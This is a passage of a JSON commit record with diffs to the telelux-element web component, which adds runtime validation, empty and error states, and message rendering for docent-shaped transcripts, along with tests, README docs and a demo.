+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "f378f8949ba8754af47f79f5aed48c556407452e",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/commits/f378f8949ba8754af47f79f5aed48c556407452e",
+          "html_url": "https://github.com/thekevinscott/telelux/commit/f378f8949ba8754af47f79f5aed48c556407452e"
+        },
+        {
+          "sha": "67d26e1c5387bc27c13278093a7a78fe9cb9f10a",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/commits/67d26e1c5387bc27c13278093a7a78fe9cb9f10a",
+          "html_url": "https://github.com/thekevinscott/telelux/commit/67d26e1c5387bc27c13278093a7a78fe9cb9f10a"
+        }
+      ],
+      "stats": {
+        "total": 758,
+        "additions": 738,
+        "deletions": 20
+      },
+      "files": [
+        {
+          "sha": "905622178960270827204b7c2194483ee558141c",
+          "filename": "docs/.vitepress/theme/HtmlPlayground.vue",
+          "status": "modified",
+          "additions": 15,
+          "deletions": 0,
+          "changes": 15,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/docs%2F.vitepress%2Ftheme%2FHtmlPlayground.vue",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/docs%2F.vitepress%2Ftheme%2FHtmlPlayground.vue",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/docs%2F.vitepress%2Ftheme%2FHtmlPlayground.vue?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -9,6 +9,21 @@ const initial = [\n   '',\n   '<telelux-transcript></telelux-transcript>',\n   '',\n+  '<script type=\"module\">',\n+  \"  document.querySelector('telelux-transcript').transcript = {\",\n+  \"    id: 'demo',\",\n+  '    metadata: {},',\n+  '    messages: [',\n+  \"      { role: 'user', content: 'What time is it in Tokyo?' },\",\n+  \"      { role: 'assistant', content: 'Let me check.', tool_calls: [\",\n+  \"        { id: 'call_1', function: 'clock', type: 'function', arguments: { zone: 'Asia/Tokyo' } },\",\n+  '      ] },',\n+  \"      { role: 'tool', content: '2026-09-25T16:00:00+09:00', tool_call_id: 'call_1', function: 'clock' },\",\n+  \"      { role: 'assistant', content: 'It is 4 pm in Tokyo.' },\",\n+  '    ],',\n+  '  };',\n+  '<\\/script>',\n+  '',\n ].join('\\n')\n \n const { isDark } = useData()"
+        },
+        {
+          "sha": "517dd229ff46004ebd3131a72d617dbbb815cb57",
+          "filename": "docs/component/index.md",
+          "status": "modified",
+          "additions": 14,
+          "deletions": 0,
+          "changes": 14,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/docs%2Fcomponent%2Findex.md",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/docs%2Fcomponent%2Findex.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/docs%2Fcomponent%2Findex.md?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -18,6 +18,20 @@ pnpm add telelux-element\n </script>\n \n <telelux-transcript></telelux-transcript>\n+\n+<script type=\"module\">\n+  document.querySelector('telelux-transcript').transcript = {\n+    id: 'demo',\n+    metadata: {},\n+    messages: [\n+      { role: 'user', content: 'What time is it in Tokyo?' },\n+      { role: 'assistant', content: 'It is 4 pm in Tokyo.' },\n+    ],\n+  };\n+</script>\n ```\n \n+The `transcript` property takes docent's transcript shape. The package README\n+documents the input in full.\n+\n See it running on the [demo](./demo) page."
+        },
+        {
+          "sha": "3a833da4c9cebe0bba47f5437c1c49d6076c9b61",
+          "filename": "packages/node/telelux-element/README.md",
+          "status": "modified",
+          "additions": 74,
+          "deletions": 2,
+          "changes": 76,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2FREADME.md",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2FREADME.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2FREADME.md?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -19,10 +19,82 @@ pnpm add telelux-element\n `lit` is a regular dependency, resolved by the host's package manager rather\n than bundled into `dist/index.js`.\n \n-Currently a scaffold: the tag renders the placeholder text \"hello world\".\n-Transcript rendering lands in later work under\n+Assign a transcript to the element's `transcript` property:\n+\n+```html\n+<telelux-transcript></telelux-transcript>\n+\n+<script type=\"module\">\n+  import 'telelux-element';\n+\n+  document.querySelector('telelux-transcript').transcript = {\n+    id: 'demo',\n+    metadata: {},\n+    messages: [\n+      { role: 'user', content: 'What time is it in Tokyo?' },\n+      { role: 'assistant', content: 'It is 4 pm in Tokyo.' },\n+    ],\n+  };\n+</script>\n+```\n+\n+Rendering is a placeholder list of messages for now. Block rendering with\n+docent parity lands in later work under\n [#49](https://github.com/thekevinscott/telelux/issues/49).\n \n+## Input\n+\n+`transcript` is a property, not an attribute. It takes a transcript in\n+[docent](https://github.com/TransluceAI/docent)'s shape, as its\n+`transcriptTypes.ts` defines it:\n+\n+```ts\n+interface Transcript {\n+  id: string;\n+  name?: string | null;\n+  created_at?: string | null;\n+  transcript_group_id?: string | null;\n+  messages: ChatMessage[];\n+  metadata: Metadata;\n+}\n+```\n+\n+Each `ChatMessage` has a `role` of `system`, `user`, `assistant`, or `tool`,\n+`content` as a string or an array of `Content` items (`text`, `image`,\n+`reasoning`), and optional `metadata`. Assistant messages may carry\n+`tool_calls` (`id`, `function`, `type`, `arguments?`, `view?`). Tool messages\n+may carry `tool_call_id`, `function`, and `error` (`type`, `message`).\n+`Metadata` is a string-keyed map of primitives, arrays of primitives, or one\n+further level of the same.\n+\n+The package exports `Transcript`, `ChatMessage`, `ToolCall`, `Content`, and\n+`Metadata` as types:\n+\n+```ts\n+import type { Transcript } from 'telelux-element';\n+```\n+\n+Anything beyond docent's shape lives in `metadata`, so a docent transcript is\n+always valid input and keys the element does not know about pass through\n+untouched.\n+\n+### States\n+\n+- **Unset** (`undefined` or `null`), or a transcript with no messages: an\n+  empty state.\n+- **Invalid**: a value that fails the runtime check renders an error state\n+  naming the failing path. The element never throws.\n+- **Valid**: one item per message.\n+\n+Setting the property again re-renders. All transcript text lands in the DOM\n+through Lit templates, so nothing in a transcript is interpreted as HTML.\n+\n+### Annotations\n+\n+`annotations` is a second property, accepted and stored but not rendered yet.\n+It reserves room for the annotation sidecar in\n+[#40](https://github.com/thekevinscott/telelux/issues/40).\n+\n ### Without a bundler\n \n ```html"
+        },
+        {
+          "sha": "7ca538d5120d19bbdfca1c2e3e8a1c41dceefc96",
+          "filename": "packages/node/telelux-element/changelog.d/2026-09-25-transcript-property.md",
+          "status": "added",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fchangelog.d%2F2026-09-25-transcript-property.md",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fchangelog.d%2F2026-09-25-transcript-property.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fchangelog.d%2F2026-09-25-transcript-property.md?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -0,0 +1 @@\n+**Added** `<telelux-transcript>` accepts a transcript in docent's shape through its `transcript` property, validates it at runtime, and renders an empty or error state instead of throwing. `Transcript`, `ChatMessage`, `ToolCall`, `Content`, and `Metadata` are exported as types. An `annotations` property is accepted and stored for #40. (#53)"
+        },
+        {
+          "sha": "284ada0d4ff9491a527553fe18c4028094ca8da4",
+          "filename": "packages/node/telelux-element/demo/main.ts",
+          "status": "modified",
+          "additions": 25,
+          "deletions": 0,
+          "changes": 25,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fdemo%2Fmain.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fdemo%2Fmain.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fdemo%2Fmain.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -1 +1,26 @@\n import '../src/index.ts';\n+import type { TeleluxTranscript, Transcript } from '../src/index.ts';\n+\n+const transcript: Transcript = {\n+  id: 'demo',\n+  name: 'Demo transcript',\n+  metadata: {},\n+  messages: [\n+    { role: 'user', content: 'What time is it in Tokyo?' },\n+    {\n+      role: 'assistant',\n+      content: [\n+        { type: 'reasoning', reasoning: 'I need the current time; a tool can give it.' },\n+        { type: 'text', text: 'Let me check.' },\n+      ],\n+      tool_calls: [{ id: 'call_1', function: 'clock', type: 'function', arguments: { zone: 'Asia/Tokyo' } }],\n+    },\n+    { role: 'tool', content: '2026-09-25T16:00:00+09:00', tool_call_id: 'call_1', function: 'clock' },\n+    { role: 'assistant', content: 'It is 4 pm in Tokyo.' },\n+  ],\n+};\n+\n+const el = document.querySelector<TeleluxTranscript>('telelux-transcript');\n+if (el) {\n+  el.transcript = transcript;\n+}"
+        },
+        {
+          "sha": "9277e8ba90a372445df937331333b74c71268246",
+          "filename": "packages/node/telelux-element/package.json",
+          "status": "modified",
+          "additions": 4,
+          "deletions": 3,
+          "changes": 7,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fpackage.json",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fpackage.json",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fpackage.json?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -43,15 +43,16 @@\n     \"@types/node\": \"^22.9.0\",\n     \"@typescript-eslint/eslint-plugin\": \"^8.61.0\",\n     \"@typescript-eslint/parser\": \"^8.61.0\",\n-    \"@vitest/coverage-v8\": \"^5.0.1\",\n+    \"@vitest/coverage-v8\": \"^4.1.11\",\n     \"eslint\": \"^10.4.1\",\n     \"jsdom\": \"^30.0.1\",\n     \"typescript\": \"^5.6.3\",\n     \"vite\": \"^8.3.0\",\n     \"vite-plugin-dts\": \"^5.1.1\",\n-    \"vitest\": \"^5.0.1\"\n+    \"vitest\": \"^4.1.11\"\n   },\n   \"dependencies\": {\n-    \"lit\": \"^3.3.3\"\n+    \"lit\": \"^3.3.3\",\n+    \"zod\": \"^4.6.5\"\n   }\n }"
+        },
+        {
+          "sha": "fc4f19f01f08f60d2b6b0e74feacd97e9c3a991f",
+          "filename": "packages/node/telelux-element/src/index.ts",
+          "status": "modified",
+          "additions": 1,
+          "deletions": 0,
+          "changes": 1,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Findex.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Findex.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Findex.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -1 +1,2 @@\n export { TeleluxTranscript } from './telelux-transcript';\n+export type { ChatMessage, Content, Metadata, ToolCall, Transcript } from './transcript';"
+        },
+        {
+          "sha": "23a2d9a0b9667dfbca0f5a832e21fae93277c44c",
+          "filename": "packages/node/telelux-element/src/message-text.test.ts",
+          "status": "added",
+          "additions": 32,
+          "deletions": 0,
+          "changes": 32,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.test.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.test.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -0,0 +1,32 @@\n+import { describe, expect, it } from 'vitest';\n+\n+import { messageText } from './message-text';\n+\n+describe('messageText', () => {\n+  it('returns string content as is', () => {\n+    expect(messageText('hello')).toBe('hello');\n+  });\n+\n+  it('joins the text items of a Content[] with newlines', () => {\n+    expect(messageText([\n+      { type: 'text', text: 'one' },\n+      { type: 'text', text: 'two' },\n+    ])).toBe('one\\ntwo');\n+  });\n+\n+  it('skips reasoning and image items', () => {\n+    expect(messageText([\n+      { type: 'reasoning', reasoning: 'hmm' },\n+      { type: 'image' },\n+      { type: 'text', text: 'only' },\n+    ])).toBe('only');\n+  });\n+\n+  it('treats a text item without text as empty', () => {\n+    expect(messageText([{ type: 'text' }, { type: 'text', text: 'b' }])).toBe('\\nb');\n+  });\n+\n+  it('returns an empty string for an empty Content[]', () => {\n+    expect(messageText([])).toBe('');\n+  });\n+});"
+        },
+        {
+          "sha": "0096865a27eb1ea13b3b87e531b482dd217adee9",
+          "filename": "packages/node/telelux-element/src/message-text.ts",
+          "status": "added",
+          "additions": 11,
+          "deletions": 0,
+          "changes": 11,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Fmessage-text.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -0,0 +1,11 @@\n+import type { ChatMessage } from './transcript';\n+\n+export function messageText(content: ChatMessage['content']): string {\n+  if (typeof content === 'string') {\n+    return content;\n+  }\n+  return content\n+    .filter((item) => item.type === 'text')\n+    .map((item) => item.text ?? '')\n+    .join('\\n');\n+}"
+        },
+        {
+          "sha": "2bb8f7c2e9a48359be2fed476fd1ac6e5578e19c",
+          "filename": "packages/node/telelux-element/src/telelux-transcript.test.ts",
+          "status": "modified",
+          "additions": 138,
+          "deletions": 6,
+          "changes": 144,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.test.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.test.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -1,6 +1,44 @@\n-import { afterEach, describe, expect, it } from 'vitest';\n+import { afterEach, describe, expect, it, vi } from 'vitest';\n \n import { TeleluxTranscript } from './telelux-transcript';\n+import type { Transcript } from './transcript';\n+\n+vi.mock('./transcript', async () => {\n+  const actual = await vi.importActual<typeof import('./transcript')>('./transcript');\n+  const parseTranscript: typeof actual.parseTranscript = (value) => {\n+    const candidate = value as { messages?: unknown };\n+    return Array.isArray(candidate.messages)\n+      ? { ok: true, transcript: value as Transcript }\n+      : { ok: false, error: 'messages: expected array' };\n+  };\n+  return { ...actual, parseTranscript };\n+});\n+\n+vi.mock('./message-text', async () => {\n+  const actual = await vi.importActual<typeof import('./message-text')>('./message-text');\n+  const messageText: typeof actual.messageText = (content) => (typeof content === 'string' ? content : '[content]');\n+  return { ...actual, messageText };\n+});\n+\n+const transcript: Transcript = {\n+  id: 't1',\n+  metadata: {},\n+  messages: [\n+    { role: 'user', content: 'first message' },\n+    { role: 'assistant', content: [{ type: 'text', text: 'second' }] },\n+  ],\n+};\n+\n+async function mount(): Promise<TeleluxTranscript> {\n+  const el = document.createElement('telelux-transcript') as TeleluxTranscript;\n+  document.body.appendChild(el);\n+  await el.updateComplete;\n+  return el;\n+}\n+\n+function text(el: TeleluxTranscript): string {\n+  return el.shadowRoot?.textContent?.replace(/\\s+/g, ' ').trim() ?? '';\n+}\n \n describe('TeleluxTranscript', () => {\n   afterEach(() => {\n@@ -11,10 +49,104 @@ describe('TeleluxTranscript', () => {\n     expect(customElements.get('telelux-transcript')).toBe(TeleluxTranscript);\n   });\n \n-  it('renders hello world in its shadow root once upgraded', async () => {\n-    const el = document.createElement('telelux-transcript') as TeleluxTranscript;\n-    document.body.appendChild(el);\n-    await el.updateComplete;\n-    expect(el.shadowRoot?.textContent?.trim()).toBe('hello world');\n+  describe('with no transcript set', () => {\n+    it('renders the empty state', async () => {\n+      const el = await mount();\n+      expect(el.shadowRoot?.querySelector('.empty')?.textContent).toBe('No transcript.');\n+    });\n+\n+    it('ignores a transcript attribute', async () => {\n+      const el = await mount();\n+      el.setAttribute('transcript', JSON.stringify(transcript));\n+      await el.updateComplete;\n+      expect(el.transcript).toBeUndefined();\n+      expect(el.shadowRoot?.querySelector('.empty')?.textContent).toBe('No transcript.');\n+    });\n+  });\n+\n+  describe('when transcript is set', () => {\n+    it('renders one item per message with its role and text', async () => {\n+      const el = await mount();\n+      el.transcript = transcript;\n+      await el.updateComplete;\n+      const items = [...(el.shadowRoot?.querySelectorAll('li') ?? [])];\n+      expect(items.map((li) => li.textContent?.trim())).toEqual(['user first message', 'assistant [content]']);\n+      expect(items[0]?.querySelector('.role')?.textContent).toBe('user');\n+    });\n+\n+    it('accepts the property before the element is upgraded', async () => {\n+      const el = document.createElement('telelux-transcript') as TeleluxTranscript;\n+      el.transcript = transcript;\n+      document.body.appendChild(el);\n+      await el.updateComplete;\n+      expect(text(el)).toContain('first message');\n+    });\n+\n+    it('re-renders when the property is set again', async () => {\n+      const el = await mount();\n+      el.transcript = transcript;\n+      await el.updateComplete;\n+      el.transcript = { ...transcript, messages: [{ role: 'system', content: 'replaced' }] };\n+      await el.updateComplete;\n+      expect(text(el)).toBe('system replaced');\n+    });\n+\n+    it('renders transcript text as text, never as markup', async () => {\n+      const el = await mount();\n+      el.transcript = { ...transcript, messages: [{ role: 'user', content: '<b>bold</b>' }] };\n+      await el.updateComplete;\n+      expect(el.shadowRoot?.querySelector('b')).toBeNull();\n+      expect(text(el)).toBe('user <b>bold</b>');\n+    });\n+\n+    it('renders the empty state for a transcript with no messages', async () => {\n+      const el = await mount();\n+      el.transcript = { ...transcript, messages: [] };\n+      await el.updateComplete;\n+      expect(el.shadowRoot?.querySelector('.empty')?.textContent).toBe('No messages.');\n+      expect(el.shadowRoot?.querySelector('ol')).toBeNull();\n+    });\n+\n+    it('returns to the empty state when the property is cleared', async () => {\n+      const el = await mount();\n+      el.transcript = transcript;\n+      await el.updateComplete;\n+      el.transcript = undefined;\n+      await el.updateComplete;\n+      expect(el.shadowRoot?.querySelector('.empty')?.textContent).toBe('No transcript.');\n+    });\n+  });\n+\n+  describe('when transcript fails the runtime check', () => {\n+    it('renders the error state with the parser message and does not throw', async () => {\n+      const el = await mount();\n+      el.transcript = { id: 'x' } as unknown as Transcript;\n+      await el.updateComplete;\n+      const error = el.shadowRoot?.querySelector('.error');\n+      expect(error?.getAttribute('role')).toBe('alert');\n+      expect(error?.textContent).toBe('Invalid transcript:\\nmessages: expected array');\n+      expect(el.shadowRoot?.querySelector('li')).toBeNull();\n+    });\n+\n+    it('recovers when a valid transcript replaces it', async () => {\n+      const el = await mount();\n+      el.transcript = 'garbage' as unknown as Transcript;\n+      await el.updateComplete;\n+      el.transcript = transcript;\n+      await el.updateComplete;\n+      expect(el.shadowRoot?.querySelector('.error')).toBeNull();\n+      expect(text(el)).toContain('first message');\n+    });\n+  });\n+\n+  describe('annotations', () => {\n+    it('stores the property without rendering it', async () => {\n+      const el = await mount();\n+      el.transcript = transcript;\n+      el.annotations = [{ label: 'cheating', note: 'suspicious' }];\n+      await el.updateComplete;\n+      expect(el.annotations).toEqual([{ label: 'cheating', note: 'suspicious' }]);\n+      expect(text(el)).not.toContain('suspicious');\n+    });\n   });\n });"
+        },
+        {
+          "sha": "02b793b49f7c16780afde353e27810b42d6ef8bc",
+          "filename": "packages/node/telelux-element/src/telelux-transcript.ts",
+          "status": "modified",
+          "additions": 32,
+          "deletions": 1,
+          "changes": 33,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftelelux-transcript.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -1,8 +1,39 @@\n import { html, LitElement } from 'lit';\n \n+import { messageText } from './message-text';\n+import { parseTranscript, type ParseResult, type Transcript } from './transcript';\n+\n export class TeleluxTranscript extends LitElement {\n+  static override properties = {\n+    transcript: { attribute: false },\n+    annotations: { attribute: false },\n+  };\n+\n+  declare transcript: Transcript | undefined;\n+  declare annotations: unknown;\n+\n+  #parsed: ParseResult | undefined;\n+\n+  protected override willUpdate() {\n+    this.#parsed = this.transcript == null ? undefined : parseTranscript(this.transcript);\n+  }\n+\n   override render() {\n-    return html`hello world`;\n+    if (this.#parsed === undefined) {\n+      return html`<p class=\"empty\">No transcript.</p>`;\n+    }\n+    if (!this.#parsed.ok) {\n+      return html`<pre class=\"error\" role=\"alert\">Invalid transcript:\\n${this.#parsed.error}</pre>`;\n+    }\n+    const { messages } = this.#parsed.transcript;\n+    if (messages.length === 0) {\n+      return html`<p class=\"empty\">No messages.</p>`;\n+    }\n+    return html`<ol>\n+      ${messages.map(\n+        (message) => html`<li><span class=\"role\">${message.role}</span> ${messageText(message.content)}</li>`,\n+      )}\n+    </ol>`;\n   }\n }\n "
+        },
+        {
+          "sha": "a9980bdeae78dfda2e4c57e80ff7c68874ead23d",
+          "filename": "packages/node/telelux-element/src/transcript.test.ts",
+          "status": "added",
+          "additions": 124,
+          "deletions": 0,
+          "changes": 124,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.test.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.test.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.test.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "patch": "@@ -0,0 +1,124 @@\n+import { describe, expect, it } from 'vitest';\n+\n+import { parseTranscript, type Transcript } from './transcript';\n+\n+const minimal: Transcript = { id: 't1', messages: [], metadata: {} };\n+\n+describe('parseTranscript', () => {\n+  describe('a transcript in docent shape', () => {\n+    it('accepts the minimal shape and returns the same object', () => {\n+      const result = parseTranscript(minimal);\n+      expect(result).toEqual({ ok: true, transcript: minimal });\n+      expect(result.ok && result.transcript).toBe(minimal);\n+    });\n+\n+    it('accepts every role with string content', () => {\n+      const transcript: Transcript = {\n+        ...minimal,\n+        messages: [\n+          { role: 'system', content: 'be brief' },\n+          { role: 'user', content: 'hi' },\n+          { role: 'assistant', content: 'hello' },\n+          { role: 'tool', content: 'ok' },\n+        ],\n+      };\n+      expect(parseTranscript(transcript).ok).toBe(true);\n+    });\n+\n+    it('accepts Content[] with text, reasoning, and image items', () => {\n+      const transcript: Transcript = {\n+        ...minimal,\n+        messages: [\n+          {\n+            role: 'assistant',\n+            content: [\n+              { type: 'reasoning', reasoning: 'thinking', signature: null, redacted: false },\n+              { type: 'text', text: 'answer', refusal: null },\n+              { type: 'image' },\n+            ],\n+          },\n+        ],\n+      };\n+      expect(parseTranscript(transcript).ok).toBe(true);\n+    });\n+\n+    it('accepts assistant tool calls with and without a view', () => {\n+      const transcript: Transcript = {\n+        ...minimal,\n+        messages: [\n+          {\n+            role: 'assistant',\n+            content: '',\n+            tool_calls: [\n+              { id: 'c1', function: 'bash', type: 'function', view: { content: 'ls', format: 'markdown' } },\n+              { id: 'c2', function: 'read', type: 'function', arguments: { path: 'a.txt', lines: [1, 2] } },\n+            ],\n+          },\n+        ],\n+      };\n+      expect(parseTranscript(transcript).ok).toBe(true);\n+    });\n+\n+    it('accepts tool messages with call id, function, and error', () => {\n+      const transcript: Transcript = {\n+        ...minimal,\n+        messages: [\n+          {\n+            role: 'tool',\n+            content: 'boom',\n+            tool_call_id: 'c1',\n+            function: 'bash',\n+            error: { type: 'runtime', message: 'exit 1' },\n+          },\n+        ],\n+      };\n+      expect(parseTranscript(transcript).ok).toBe(true);\n+    });\n+\n+    it('accepts nested metadata on the transcript and on messages', () => {\n+      const transcript: Transcript = {\n+        ...minimal,\n+        name: 'run',\n+        created_at: '2026-09-25T00:00:00Z',\n+        transcript_group_id: null,\n+        metadata: { model: 'x', tags: ['a', 'b'], usage: { input: 1, output: 2 } },\n+        messages: [{ role: 'user', content: '{bad json', metadata: { raw: true } }],\n+      };\n+      expect(parseTranscript(transcript).ok).toBe(true);\n+    });\n+\n+    it('keeps keys it does not know about', () => {\n+      const transcript = { ...minimal, messages: [{ role: 'assistant', content: 'x', citations: [] }] };\n+      const result = parseTranscript(transcript);\n+      expect(result.ok && result.transcript).toBe(transcript);\n+    });\n+  });\n+\n+  describe('a value that is not a transcript', () => {\n+    it.each([\n+      ['a string', 'nope'],\n+      ['null', null],\n+      ['a number', 3],\n+      ['an empty object', {}],\n+      ['missing id', { messages: [], metadata: {} }],\n+      ['missing messages', { id: 't1', metadata: {} }],\n+      ['missing metadata', { id: 't1', messages: [] }],\n+      ['a non-string name', { ...minimal, name: 3 }],\n+      ['a non-array messages', { ...minimal, messages: 'x' }],\n+      ['an unknown role', { ...minimal, messages: [{ role: 'robot', content: 'x' }] }],\n+      ['content of the wrong type', { ...minimal, messages: [{ role: 'user', content: 3 }] }],\n+      ['a content item of unknown type', { ...minimal, messages: [{ role: 'user', content: [{ type: 'audio' }] }] }],\n+      ['a tool call without an id', { ...minimal, messages: [{ role: 'assistant', content: '', tool_calls: [{ function: 'f', type: 'function' }] }] }],\n+      ['a tool error without a message', { ...minimal, messages: [{ role: 'tool', content: '', error: { type: 'x' } }] }],\n+      ['metadata nested too deep', { ...minimal, metadata: { a: { b: { c: 1 } } } }],\n+    ])('rejects %s', (_label, value) => {\n+      expect(parseTranscript(value).ok).toBe(false);\n+    });\n+\n+    it('names the failing path in the error', () => {\n+      const result = parseTranscript({ ...minimal, messages: [{ role: 'user', content: 3 }] });\n+      expect(result.ok).toBe(false);\n+      expect(!result.ok && result.error).toContain('messages[0].content');\n+    });\n+  });\n+});"
+        },
+        {
+          "sha": "6d69283d3ce12081441860d9cc29c8ff9daa1141",
+          "filename": "packages/node/telelux-element/src/transcript.ts",
+          "status": "added",
+          "additions": 70,
+          "deletions": 0,
+          "changes": 70,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.ts",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/bfc749a2b01f19cddac06c03d347b9663ebef86b/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.ts",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/packages%2Fnode%2Ftelelux-element%2Fsrc%2Ftranscript.ts?ref=bfc749a2b01f19cddac06c03d347b9663ebef86b",
